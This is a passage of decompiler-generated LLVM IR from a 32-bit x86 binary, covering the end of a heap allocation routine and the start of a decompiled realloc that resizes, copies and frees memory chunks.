  %v1_8052f4a = add i32 %v0_8052f4a, 12
  %v2_8052f4a = inttoptr i32 %v1_8052f4a to i32*
  store i32 ptrtoint (i32* @global_var_80688d4.734 to i32), i32* %v2_8052f4a, align 4
  %v0_8052f51 = load i32, i32* @ecx, align 4
  %v1_8052f51 = load i32, i32* @edx, align 4
  %v2_8052f51 = add i32 %v1_8052f51, 4
  %v3_8052f51 = inttoptr i32 %v2_8052f51 to i32*
  store i32 %v0_8052f51, i32* %v3_8052f51, align 4
  %v0_8052f54 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f54 = load i32, i32* @edx, align 4
  %v3_8052f54 = add i32 %v1_8052f54, %v0_8052f54
  %v4_8052f54 = inttoptr i32 %v3_8052f54 to i32*
  store i32 %v0_8052f54, i32* %v4_8052f54, align 4
  br label %dec_label_pc_8052f62

dec_label_pc_8052f59:                             ; preds = %dec_label_pc_8052939
  store i32 %v1_8052bf2, i32* %ebx.global-to-local, align 4
  %v0_8052f5d = load i32, i32* @ebp, align 4
  %v2_8052f5d = or i32 %v1_8052bf2, 4
  %v3_8052f5d = add i32 %v0_8052f5d, %v2_8052f5d
  %v4_8052f5d = inttoptr i32 %v3_8052f5d to i32*
  %v5_8052f5d = load i32, i32* %v4_8052f5d, align 4
  %v6_8052f5d = or i32 %v5_8052f5d, 1
  store i32 %v6_8052f5d, i32* %v4_8052f5d, align 4
  br label %dec_label_pc_8052f62

dec_label_pc_8052f62:                             ; preds = %dec_label_pc_8052f18, %dec_label_pc_8052f59
  %v0_8052f62 = load i32, i32* @ebp, align 4
  %v1_8052f62 = add i32 %v0_8052f62, 8
  store i32 %v1_8052f62, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f67:                             ; preds = %dec_label_pc_8052a29
  %v1_8052f67 = load i32, i32* @ebx, align 4
  %v2_8052f67 = add i32 %v0_8052a35, 4
  %v3_8052f67 = add i32 %v2_8052f67, %v1_8052f67
  %v4_8052f67 = inttoptr i32 %v3_8052f67 to i32*
  %v5_8052f67 = load i32, i32* %v4_8052f67, align 4
  %v6_8052f67 = or i32 %v5_8052f67, 1
  store i32 %v6_8052f67, i32* %v4_8052f67, align 4
  br label %dec_label_pc_8052f6c

dec_label_pc_8052f6c:                             ; preds = %dec_label_pc_8052a41, %dec_label_pc_8052f67
  %v0_8052f6c = load i32, i32* @ecx, align 4
  store i32 %v0_8052f6c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f70:                             ; preds = %dec_label_pc_8052d13, %dec_label_pc_8052eb2, %dec_label_pc_8052d55, %dec_label_pc_8052d2b
  %v0_8052f70 = load i32, i32* %stack_var_-92, align 4
  %v1_8052f70 = call i32 @__errno_location(i32 %v0_8052f70)
  store i32 %v1_8052f70, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8052f77 = inttoptr i32 %v1_8052f70 to i32*
  store i32 12, i32* %v1_8052f77, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f7d:                             ; preds = %dec_label_pc_8052f6c, %dec_label_pc_8052f62, %dec_label_pc_8052f0d, %dec_label_pc_8052ba3, %dec_label_pc_8052b55, %dec_label_pc_80528d4, %dec_label_pc_8052f70
  store i32 %v2_805280b, i32* @eax, align 4
  store i32 %v2_805280b, i32* %stack_var_-92, align 4
  %v2_8052f86 = call i32 @__pthread_return_void(i32 %v2_805280b, i32 1)
  store i32 %v2_8052f86, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f8e

dec_label_pc_8052f8e:                             ; preds = %dec_label_pc_8052829, %dec_label_pc_8052f7d
  %v0_8052f91 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052f91, i32* %eax.global-to-local, align 4
  %v2_8052f93 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052f93, i32* @ebx, align 4
  store i32 %v0_80527f8, i32* @esi, align 4
  store i32 %v0_80527f7, i32* @edi, align 4
  store i32 %v0_80527f6, i32* @ebp, align 4
  ret i32 %v0_8052f91

; uselistorder directives
  uselistorder i32 %v0_8052f54, { 1, 0 }
  uselistorder i32 %v1_8052ed8, { 1, 0 }
  uselistorder i32 %v2_8052ecc, { 1, 0 }
  uselistorder i32 %v0_8052eb7, { 1, 0 }
  uselistorder i32 %v0_8052eb2, { 0, 2, 1 }
  uselistorder i32 %v1_8052e49, { 1, 0, 2 }
  uselistorder i32 %v0_8052e49, { 1, 0 }
  uselistorder i32 %v2_8052e37, { 1, 0 }
  uselistorder i32 %v1_8052dee, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_8052ddc, { 1, 0, 2 }
  uselistorder i32 %v2_8052dcc, { 1, 2, 0 }
  uselistorder i32 %v2_8052dc7, { 1, 0, 2 }
  uselistorder i32 %v1_8052db7, { 2, 1, 0 }
  uselistorder i8 %v0_8052d85, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_8052d68, { 1, 0, 2 }
  uselistorder i32 %v0_8052e2a, { 4, 5, 2, 3, 6, 1, 8, 7, 0 }
  uselistorder i32 %v0_8052e1c, { 2, 0, 1 }
  uselistorder i32 %v8_8052d38, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v5_8052d1e, { 1, 0, 2 }
  uselistorder i32 %v3_8052d1e, { 1, 0 }
  uselistorder i32 %v1_8052cec, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8052ce0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8052cdc, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_8052cca, { 1, 0 }
  uselistorder i32 %v1_8052cba, { 5, 1, 2, 3, 4, 0, 6, 7 }
  uselistorder i32 %v0_8052caa, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v1_8052c93, { 1, 0 }
  uselistorder i32 %v2_8052c87, { 1, 0 }
  uselistorder i32 %v2_8052c77, { 0, 3, 1, 2 }
  uselistorder i32 %v2_8052c5b, { 1, 2, 0 }
  uselistorder i32 %v1_8052c5b, { 1, 0, 2 }
  uselistorder i32 %v1_8052c5a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_8052c54, { 1, 0 }
  uselistorder i32 %v2_8052c32, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8052c26, { 2, 1, 0 }
  uselistorder i32 %v8_8052c11, { 4, 3, 2, 1, 5, 0, 6 }
  uselistorder i32 %v2_8052bf8, { 1, 0, 2 }
  uselistorder i32 %v0_8052b9b, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_8052b6a, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8052b5d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_8052b43, { 1, 0, 2 }
  uselistorder i32 %v1_8052add, { 1, 0 }
  uselistorder i32 %v3_8052ad2, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_8052acc, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_8052ac912, { 1, 0 }
  uselistorder i32 %v2_8052abe, { 1, 0 }
  uselistorder i32 %v1_8052aa2, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_8052a9e, { 2, 1, 0 }
  uselistorder i32 %v1_8052a9a, { 1, 0 }
  uselistorder i32 %v1_8052a95, { 2, 1, 0 }
  uselistorder i32 %v2_8052a84, { 1, 0 }
  uselistorder i32 %v1_8052a81, { 1, 2, 0, 3 }
  uselistorder i32 %v4_8052a1f, { 2, 6, 4, 5, 3, 1, 0 }
  uselistorder i32 %v0_8052a6a, { 1, 0 }
  uselistorder i32 %v0_8052a35, { 1, 2, 0, 3 }
  uselistorder i32 %v3_8052a0b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80529d8, { 0, 2, 1 }
  uselistorder i32 %v2_80529bc, { 1, 0 }
  uselistorder i32 %v1_80529b2, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_80529ad.lcssa, { 1, 0 }
  uselistorder i32 %v3_805299d, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_8052994, { 1, 0, 2 }
  uselistorder i32 %v3_8052977, { 5, 1, 2, 3, 4, 6, 0, 7 }
  uselistorder i32 %v2_8052970, { 1, 0, 2 }
  uselistorder i32 %v2_8052958, { 2, 1, 0 }
  uselistorder i32 %v0_8052944, { 2, 1, 3, 0 }
  uselistorder i32 %v3_805290a, { 2, 1, 0, 3 }
  uselistorder i32 %v0_80529d8118, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80529d8109, { 1, 0, 2 }
  uselistorder i32 %v3_80528b7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80528a9, { 2, 1, 0 }
  uselistorder i32 %v2_8052884, { 2, 1, 0 }
  uselistorder i8 %v0_8052852, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_8052bf2, { 13, 32, 11, 5, 30, 12, 6, 23, 22, 2, 1, 7, 25, 24, 21, 19, 20, 8, 27, 26, 28, 9, 29, 16, 10, 17, 18, 0, 31, 14, 15, 3, 33, 35, 34, 4, 36 }
  uselistorder i32 %v1_805283b, { 1, 2, 0 }
  uselistorder i32 %v0_8052824, { 1, 0 }
  uselistorder i32 %v2_805280b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 10, 14, 11, 0, 12, 13, 15, 16, 17, 18, 1, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 54, 49, 50, 53, 52, 51, 55, 56, 57, 58, 59, 61, 60, 62, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i8 -2, { 0, 1, 3, 2, 4 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i8* @global_var_8068c00.747, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134645972, { 0, 3, 1, 2 }
  uselistorder i32* @global_var_80688e0.735, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_80688cc.732 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_80688cc.732 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_8052f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8052f7d, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_8052f70, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8052f6c, { 1, 0 }
  uselistorder label %dec_label_pc_8052f62, { 1, 0 }
  uselistorder label %dec_label_pc_8052f0d, { 1, 0 }
  uselistorder label %dec_label_pc_8052eb2, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8052e44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e3f, { 1, 0 }
  uselistorder label %dec_label_pc_8052e23, { 1, 0 }
  uselistorder label %dec_label_pc_8052dcc, { 1, 0 }
  uselistorder label %dec_label_pc_8052db5, { 1, 0 }
  uselistorder label %dec_label_pc_8052d9e, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8052d55, { 1, 0 }
  uselistorder label %dec_label_pc_8052d13, { 1, 0 }
  uselistorder label %dec_label_pc_8052caa, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8052c49, { 1, 0 }
  uselistorder label %dec_label_pc_8052b5d, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052b55, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052ac9, { 1, 0 }
  uselistorder label %dec_label_pc_8052ace.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8052aa2, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a29, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_80529b0, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8052999, { 1, 0 }
  uselistorder label %dec_label_pc_8052907, { 1, 0 }
  uselistorder label %dec_label_pc_80529d8.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80528d4, { 1, 0 }
  uselistorder label %dec_label_pc_8052852, { 1, 0 }
}

define i32 @realloc(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp8 = ptrtoint i32* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_8052f9a = load i32, i32* @esi, align 4
  %v0_8052f9b = load i32, i32* @ebx, align 4
  %v4_8052f9f = icmp eq i32* %arg1, null
  store i32 %arg2, i32* @ebx, align 4
  %v1_8052fa8 = icmp eq i1 %v4_8052f9f, false
  br i1 %v1_8052fa8, label %dec_label_pc_8052fba, label %dec_label_pc_8052faa

dec_label_pc_8052faa:                             ; preds = %entry
  store i32 %arg2, i32* %stack_var_-60, align 4
  %v1_8052fae = call i32 @malloc(i32 %arg2)
  store i32 %v1_8052fae, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fae, i32* @ebx, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_8052fba:                             ; preds = %entry
  %v1_8052fba = icmp eq i32 %arg2, 0
  %v1_8052fbc = icmp eq i1 %v1_8052fba, false
  br i1 %v1_8052fbc, label %dec_label_pc_8052fcf, label %dec_label_pc_8052fbe

dec_label_pc_8052fbe:                             ; preds = %dec_label_pc_8052fba
  store i32 %tmp8, i32* %stack_var_-60, align 4
  %v1_8052fc5 = call i32 @free(i32 %tmp8)
  store i32 %v1_8052fc5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80532c1

dec_label_pc_8052fcf:                             ; preds = %dec_label_pc_8052fba
  %v2_8052fda = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8052fda, i32* @eax, align 4
  store i32 %v2_8052fda, i32* %stack_var_-60, align 4
  %v2_8052fdf = call i32 @__pthread_return_void(i32 %v2_8052fda, i32 134562299)
  store i32 %v2_8052fdf, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8062430.730 to i32), i32* %stack_var_-60, align 4
  %v1_8052feb = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062430.730 to i32))
  store i32 %v1_8052feb, i32* %eax.global-to-local, align 4
  %v0_8052ff3 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8052ff3, -32
  br i1 %tmp, label %dec_label_pc_805300a, label %dec_label_pc_8052ff8

dec_label_pc_8052ff8:                             ; preds = %dec_label_pc_8052fcf
  %v0_8052ff8 = load i32, i32* %stack_var_-60, align 4
  %v1_8052ff8 = call i32 @__errno_location(i32 %v0_8052ff8)
  store i32 %v1_8052ff8, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_8052fff = inttoptr i32 %v1_8052ff8 to i32*
  store i32 12, i32* %v1_8052fff, align 4
  br label %dec_label_pc_80532c4

dec_label_pc_805300a:                             ; preds = %dec_label_pc_8052fcf
  %v1_805300a = add i32 %v0_8052ff3, 11
  %tmp22 = icmp ult i32 %v1_805300a, 16
  br i1 %tmp22, label %dec_label_pc_8053021, label %dec_label_pc_805301a

dec_label_pc_805301a:                             ; preds = %dec_label_pc_805300a
  %v1_805301a = and i32 %v1_805300a, -8
  br label %dec_label_pc_8053021

dec_label_pc_8053021:                             ; preds = %dec_label_pc_805300a, %dec_label_pc_805301a
  %stack_var_-40.0 = phi i32 [ %v1_805301a, %dec_label_pc_805301a ], [ 16, %dec_label_pc_805300a ]
  %storemerge21 = phi i32 [ %v1_805301a, %dec_label_pc_805301a ], [ %v1_805300a, %dec_label_pc_805300a ]
  store i32 %storemerge21, i32* %eax.global-to-local, align 4
  %v1_8053025 = add i32 %tmp8, -8
  store i32 %v1_8053025, i32* @edi, align 4
  %v1_8053028 = add i32 %tmp8, -4
  %v2_8053028 = inttoptr i32 %v1_8053028 to i32*
  %v3_8053028 = load i32, i32* %v2_8053028, align 4
  store i32 %v3_8053028, i32* @edx, align 4
  %v1_805302d = and i32 %v3_8053028, -4
  store i32 %v1_805302d, i32* %eax.global-to-local, align 4
  %v2_8053030 = and i32 %v3_8053028, 2
  %v3_8053030 = icmp eq i32 %v2_8053030, 0
  %v1_8053037 = icmp eq i1 %v3_8053030, false
  br i1 %v1_8053037, label %dec_label_pc_80531d1, label %dec_label_pc_805303d

dec_label_pc_805303d:                             ; preds = %dec_label_pc_8053021
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805302d, i32* @ebx, align 4
  %v7_8053043 = icmp ult i32 %v1_805302d, %stack_var_-40.0
  %v1_8053045 = icmp eq i1 %v7_8053043, false
  br i1 %v1_8053045, label %dec_label_pc_805317c, label %dec_label_pc_805304b

dec_label_pc_805304b:                             ; preds = %dec_label_pc_805303d
  %v2_805304b = add i32 %v1_805302d, %v1_8053025
  store i32 %v2_805304b, i32* @esi, align 4
  %v1_805304e = load i32, i32* @global_var_80688cc.732, align 4
  %v12_805304e = icmp eq i32 %v2_805304b, %v1_805304e
  %v1_8053054 = icmp eq i1 %v12_805304e, false
  %v1_805308e = add i32 %v2_805304b, 4
  %v2_805308e = inttoptr i32 %v1_805308e to i32*
  %v3_805308e = load i32, i32* %v2_805308e, align 4
  br i1 %v1_8053054, label %dec_label_pc_805308e, label %dec_label_pc_8053056

dec_label_pc_8053056:                             ; preds = %dec_label_pc_805304b
  %v1_805305b = and i32 %v3_805308e, -4
  %v2_805305e = add i32 %v1_805305b, %v1_805302d
  store i32 %v2_805305e, i32* %ecx.global-to-local, align 4
  %v1_8053064 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053064, i32* %eax.global-to-local, align 4
  %v7_8053067 = icmp ult i32 %v2_805305e, %v1_8053064
  br i1 %v7_8053067, label %dec_label_pc_80530cc, label %dec_label_pc_805306b

dec_label_pc_805306b:                             ; preds = %dec_label_pc_8053056
  %v1_805306b = urem i32 %v3_8053028, 2
  %v5_805306e = or i32 %v1_805306b, %stack_var_-40.0
  store i32 %v5_805306e, i32* @edx, align 4
  store i32 %v5_805306e, i32* %v2_8053028, align 4
  %v0_8053079 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053079 = sub i32 %v0_8053079, %stack_var_-40.0
  %v0_805307b = load i32, i32* @edi, align 4
  %v2_805307b = add i32 %v0_805307b, %stack_var_-40.0
  store i32 %v2_805307b, i32* %eax.global-to-local, align 4
  %v1_805307e = or i32 %v2_8053079, 1
  store i32 %v1_805307e, i32* %ecx.global-to-local, align 4
  store i32 %v2_805307b, i32* @global_var_80688cc.732, align 4
  %v2_8053086 = add i32 %v2_805307b, 4
  %v3_8053086 = inttoptr i32 %v2_8053086 to i32*
  store i32 %v1_805307e, i32* %v3_8053086, align 4
  br label %dec_label_pc_80532af

dec_label_pc_805308e:                             ; preds = %dec_label_pc_805304b
  %v1_8053093 = and i32 %v3_805308e, -2
  store i32 %v1_8053093, i32* %eax.global-to-local, align 4
  %v3_8053096 = add i32 %v1_805308e, %v1_8053093
  %v4_8053096 = inttoptr i32 %v3_8053096 to i8*
  %v5_8053096 = load i8, i8* %v4_8053096, align 1
  %v6_8053096 = urem i8 %v5_8053096, 2
  %v7_8053096 = icmp eq i8 %v6_8053096, 0
  %v1_805309b = icmp eq i1 %v7_8053096, false
  br i1 %v1_805309b, label %dec_label_pc_80530cc, label %dec_label_pc_805309d

dec_label_pc_805309d:                             ; preds = %dec_label_pc_805308e
  %v1_80530a1 = and i32 %v3_805308e, -4
  %v2_80530a4 = add i32 %v1_80530a1, %v1_805302d
  store i32 %v2_80530a4, i32* @ebx, align 4
  %v10_80530a6 = icmp ult i32 %v2_80530a4, %stack_var_-40.0
  br i1 %v10_80530a6, label %dec_label_pc_80530cc, label %dec_label_pc_80530ac

dec_label_pc_80530ac:                             ; preds = %dec_label_pc_805309d
  %v1_80530ac = add i32 %v1_805302d, %tmp8
  %v2_80530ac = inttoptr i32 %v1_80530ac to i32*
  %v3_80530ac = load i32, i32* %v2_80530ac, align 4
  store i32 %v3_80530ac, i32* @edx, align 4
  %v1_80530af = add i32 %v2_805304b, 12
  %v2_80530af = inttoptr i32 %v1_80530af to i32*
  %v3_80530af = load i32, i32* %v2_80530af, align 4
  store i32 %v3_80530af, i32* %eax.global-to-local, align 4
  %v1_80530b2 = add i32 %v3_80530ac, 12
  %v2_80530b2 = inttoptr i32 %v1_80530b2 to i32*
  %v3_80530b2 = load i32, i32* %v2_80530b2, align 4
  %v15_80530b2 = icmp eq i32 %v3_80530b2, %v2_805304b
  %v1_80530b5 = icmp eq i1 %v15_80530b2, false
  br i1 %v1_80530b5, label %dec_label_pc_80530bc, label %dec_label_pc_80530b7

dec_label_pc_80530b7:                             ; preds = %dec_label_pc_80530ac
  %v1_80530b7 = add i32 %v3_80530af, 8
  %v2_80530b7 = inttoptr i32 %v1_80530b7 to i32*
  %v3_80530b7 = load i32, i32* %v2_80530b7, align 4
  %v15_80530b7 = icmp eq i32 %v3_80530b7, %v2_805304b
  br i1 %v15_80530b7, label %dec_label_pc_80530c1, label %dec_label_pc_80530bc

dec_label_pc_80530bc:                             ; preds = %dec_label_pc_80530b7, %dec_label_pc_80530ac
  %v0_80530bc = call i32 @abort()
  store i32 %v0_80530bc, i32* %eax.global-to-local, align 4
  %v1_80530c1.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80530c1

dec_label_pc_80530c1:                             ; preds = %dec_label_pc_80530b7, %dec_label_pc_80530bc
  %v1_80530c1 = phi i32 [ %v3_80530ac, %dec_label_pc_80530b7 ], [ %v1_80530c1.pre, %dec_label_pc_80530bc ]
  %v0_80530c1 = phi i32 [ %v3_80530af, %dec_label_pc_80530b7 ], [ %v0_80530bc, %dec_label_pc_80530bc ]
  %v2_80530c1 = add i32 %v1_80530c1, 12
  %v3_80530c1 = inttoptr i32 %v2_80530c1 to i32*
  store i32 %v0_80530c1, i32* %v3_80530c1, align 4
  %v0_80530c4 = load i32, i32* @edx, align 4
  %v1_80530c4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80530c4 = add i32 %v1_80530c4, 8
  %v3_80530c4 = inttoptr i32 %v2_80530c4 to i32*
  store i32 %v0_80530c4, i32* %v3_80530c4, align 4
  %v0_805317c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805317c

dec_label_pc_80530cc:                             ; preds = %dec_label_pc_805309d, %dec_label_pc_805308e, %dec_label_pc_8053056
  %v1_80530d3 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80530d3, i32* %eax.global-to-local, align 4
  store i32 %v1_80530d3, i32* %stack_var_-60, align 4
  %v1_80530d7 = call i32 @malloc(i32 %v1_80530d3)
  store i32 %v1_80530d7, i32* %eax.global-to-local, align 4
  %v1_80530df = icmp eq i32 %v1_80530d7, 0
  store i32 %v1_80530d7, i32* @edx, align 4
  br i1 %v1_80530df, label %dec_label_pc_80532ab, label %dec_label_pc_80530e9

dec_label_pc_80530e9:                             ; preds = %dec_label_pc_80530cc
  %v1_80530e9 = add i32 %v1_80530d7, -8
  store i32 %v1_80530e9, i32* %ebx.global-to-local, align 4
  %v1_80530ec = load i32, i32* @esi, align 4
  %v12_80530ec = icmp eq i32 %v1_80530e9, %v1_80530ec
  %v1_80530ee = add i32 %v1_80530d7, -4
  %v2_80530ee = inttoptr i32 %v1_80530ee to i32*
  %v3_80530ee = load i32, i32* %v2_80530ee, align 4
  store i32 %v3_80530ee, i32* %eax.global-to-local, align 4
  %v1_80530f1 = icmp eq i1 %v12_80530ec, false
  br i1 %v1_80530f1, label %dec_label_pc_80530ff, label %dec_label_pc_80530f3

dec_label_pc_80530f3:                             ; preds = %dec_label_pc_80530e9
  store i32 %v1_805302d, i32* @edx, align 4
  %v1_80530f7 = and i32 %v3_80530ee, -4
  store i32 %v1_80530f7, i32* %eax.global-to-local, align 4
  %v2_80530fa = add i32 %v1_80530f7, %v1_805302d
  store i32 %v2_80530fa, i32* @ebx, align 4
  br label %dec_label_pc_805317c

dec_label_pc_80530ff:                             ; preds = %dec_label_pc_80530e9
  %v1_8053103 = add i32 %v1_805302d, -4
  store i32 %v1_8053103, i32* %eax.global-to-local, align 4
  %v2_8053108 = udiv i32 %v1_8053103, 4
  store i32 %v2_8053108, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v1_8053103, 37
  br i1 %tmp23, label %dec_label_pc_8053121, label %dec_label_pc_8053110

dec_label_pc_8053110:                             ; preds = %dec_label_pc_80530ff
  store i32 %v1_80530d7, i32* %stack_var_-60, align 4
  %v3_8053117 = inttoptr i32 %v1_80530d7 to i16*
  %v4_8053117 = call i32 @memcpy(i16* %v3_8053117, i32 %tmp8, i32 %v1_8053103)
  store i32 %v4_8053117, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053168

dec_label_pc_8053121:                             ; preds = %dec_label_pc_80530ff
  store i32 %tmp8, i32* @esi, align 4
  %v2_8053128 = load i32, i32* %arg1, align 4
  store i32 %v2_8053128, i32* %eax.global-to-local, align 4
  %v2_805312a = inttoptr i32 %v1_80530d7 to i32*
  store i32 %v2_8053128, i32* %v2_805312a, align 4
  %v0_805312c = load i32, i32* @esi, align 4
  %v1_805312c = add i32 %v0_805312c, 4
  %v2_805312c = inttoptr i32 %v1_805312c to i32*
  %v3_805312c = load i32, i32* %v2_805312c, align 4
  store i32 %v3_805312c, i32* %eax.global-to-local, align 4
  %v1_805312f = load i32, i32* @edx, align 4
  %v2_805312f = add i32 %v1_805312f, 4
  %v3_805312f = inttoptr i32 %v2_805312f to i32*
  store i32 %v3_805312c, i32* %v3_805312f, align 4
  %v0_8053132 = load i32, i32* @esi, align 4
  %v1_8053132 = add i32 %v0_8053132, 8
  %v2_8053132 = inttoptr i32 %v1_8053132 to i32*
  %v3_8053132 = load i32, i32* %v2_8053132, align 4
  store i32 %v3_8053132, i32* %eax.global-to-local, align 4
  %v1_8053135 = load i32, i32* @edx, align 4
  %v2_8053135 = add i32 %v1_8053135, 8
  %v3_8053135 = inttoptr i32 %v2_8053135 to i32*
  store i32 %v3_8053132, i32* %v3_8053135, align 4
  %tmp24 = icmp ult i32 %v1_8053103, 17
  br i1 %tmp24, label %dec_label_pc_8053168, label %dec_label_pc_805313a

dec_label_pc_805313a:                             ; preds = %dec_label_pc_8053121
  %v0_805313a = load i32, i32* @esi, align 4
  %v1_805313a = add i32 %v0_805313a, 12
  %v2_805313a = inttoptr i32 %v1_805313a to i32*
  %v3_805313a = load i32, i32* %v2_805313a, align 4
  store i32 %v3_805313a, i32* %eax.global-to-local, align 4
  %v0_805313d = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053140 = load i32, i32* @edx, align 4
  %v2_8053140 = add i32 %v1_8053140, 12
  %v3_8053140 = inttoptr i32 %v2_8053140 to i32*
  store i32 %v3_805313a, i32* %v3_8053140, align 4
  %v0_8053143 = load i32, i32* @esi, align 4
  %v1_8053143 = add i32 %v0_8053143, 16
  %v2_8053143 = inttoptr i32 %v1_8053143 to i32*
  %v3_8053143 = load i32, i32* %v2_8053143, align 4
  store i32 %v3_8053143, i32* %eax.global-to-local, align 4
  %v1_8053146 = load i32, i32* @edx, align 4
  %v2_8053146 = add i32 %v1_8053146, 16
  %v3_8053146 = inttoptr i32 %v2_8053146 to i32*
  store i32 %v3_8053143, i32* %v3_8053146, align 4
  %tmp25 = icmp ult i32 %v0_805313d, 7
  br i1 %tmp25, label %dec_label_pc_8053168, label %dec_label_pc_805314b

dec_label_pc_805314b:                             ; preds = %dec_label_pc_805313a
  %v0_805314b = load i32, i32* @esi, align 4
  %v1_805314b = add i32 %v0_805314b, 20
  %v2_805314b = inttoptr i32 %v1_805314b to i32*
  %v3_805314b = load i32, i32* %v2_805314b, align 4
  store i32 %v3_805314b, i32* %eax.global-to-local, align 4
  %v0_805314e = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053151 = load i32, i32* @edx, align 4
  %v2_8053151 = add i32 %v1_8053151, 20
  %v3_8053151 = inttoptr i32 %v2_8053151 to i32*
  store i32 %v3_805314b, i32* %v3_8053151, align 4
  %v0_8053154 = load i32, i32* @esi, align 4
  %v1_8053154 = add i32 %v0_8053154, 24
  %v2_8053154 = inttoptr i32 %v1_8053154 to i32*
  %v3_8053154 = load i32, i32* %v2_8053154, align 4
  store i32 %v3_8053154, i32* %eax.global-to-local, align 4
  %v1_8053157 = load i32, i32* @edx, align 4
  %v2_8053157 = add i32 %v1_8053157, 24
  %v3_8053157 = inttoptr i32 %v2_8053157 to i32*
  store i32 %v3_8053154, i32* %v3_8053157, align 4
  %tmp26 = icmp ult i32 %v0_805314e, 9
  br i1 %tmp26, label %dec_label_pc_8053168, label %dec_label_pc_805315c

dec_label_pc_805315c:                             ; preds = %dec_label_pc_805314b
  %v0_805315c = load i32, i32* @esi, align 4
  %v1_805315c = add i32 %v0_805315c, 28
